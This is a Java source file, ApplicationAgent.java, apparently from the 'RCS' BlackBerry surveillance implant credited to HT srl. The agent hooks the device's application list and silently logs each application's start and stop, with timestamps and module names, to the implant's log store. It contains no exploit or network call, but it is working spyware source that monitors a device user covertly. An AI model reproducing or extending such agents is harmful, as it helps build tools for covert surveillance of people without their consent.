/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ApplicationAgent.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry.agent;

import java.util.Vector;

import blackberry.AppListener;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * log dei start e stop delle applicazioni.
 */
public final class ApplicationAgent extends Agent implements
        ApplicationListObserver {
    // #mdebug
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);
    // #enddebug

    public int LOG_DELIMITER = 0xABADC0DE;

    boolean firstRun = true;

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ApplicationAgent(final boolean agentStatus) {
        super(Agent.AGENT_APPLICATION, agentStatus, true, "ApplicationAgent");
    }

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ApplicationAgent(final boolean agentStatus,
            final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        // #debug debug
        debug.trace("run");

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        // #debug debug
        debug.trace("actualStart");
        firstRun = true;
        AppListener.getInstance().addApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        // #debug debug
        debug.trace("actualStop");
        AppListener.getInstance().removeApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
     * (java.util.Vector, java.util.Vector)
     */
    public synchronized void onApplicationListChange(final Vector startedListName,
            final Vector stoppedListName, final Vector startedListMod,
            final Vector stoppedListMod) {

        // #ifdef DBC
        Check.requires(startedListName != null, "startedListName != null");
        Check.requires(stoppedListName != null, "stoppedListName != null");
        Check.requires(startedListMod != null, "startedListMod != null");
        Check.requires(stoppedListMod != null, "stoppedListMod != null");
        // #endif

        if (firstRun) {
            // #debug info
            debug.info("skipping first run");

            // #ifdef DBC
            Check.asserts(startedListName.size() > 0, "startedList.size() > 0");
            Check.asserts(stoppedListName.size() == 0, "stoppedList.size() == 0");
            Check.asserts(startedListMod.size() > 0, "startedList.size() > 0");
            Check.asserts(stoppedListMod.size() == 0, "stoppedList.size() == 0");
            // #endif

            firstRun = false;
            return;
        }

        log.createLog(null);

        int size = startedListName.size();
        for (int i = 0; i < size; i++) {
            String name = (String) startedListName.elementAt(i);
            String mod = (String) startedListMod.elementAt(i);
            //#debug debug
            debug.trace(name + " START");
            writeLog(name, "START", mod);
        }

        size = stoppedListName.size();
        for (int i = 0; i < size; i++) {
            String name = (String) stoppedListName.elementAt(i);
            String mod = (String) stoppedListMod.elementAt(i);
            //#debug debug
            debug.trace(name + " STOP");
            writeLog(name, "STOP", mod);
        }

        log.close();

        //#debug debug
        debug.trace("finished writing log");
    }
    
    public synchronized void onApplicationListChangeMod(final Vector startedList,
            final Vector stoppedList) {
    //TODO: onApplicationListChangeMod
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // #debug debug
        debug.trace("parse");
        
        //#mdebug
        StringBuffer sb = new StringBuffer();
        //#debug info
        debug.info(sb.toString());
        //#enddebug
        
        return false;
    }

    private void writeLog(final String appName, final String condition, final String mod) {
        final byte[] tm = (new DateTime()).getStructTm();

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(WChar.getBytes(appName, true));
        items.addElement(WChar.getBytes(condition, true));
        items.addElement(WChar.getBytes(mod, true));
        items.addElement(Utils.intToByteArray(LOG_DELIMITER));
        log.writeLogs(items);

    }
}
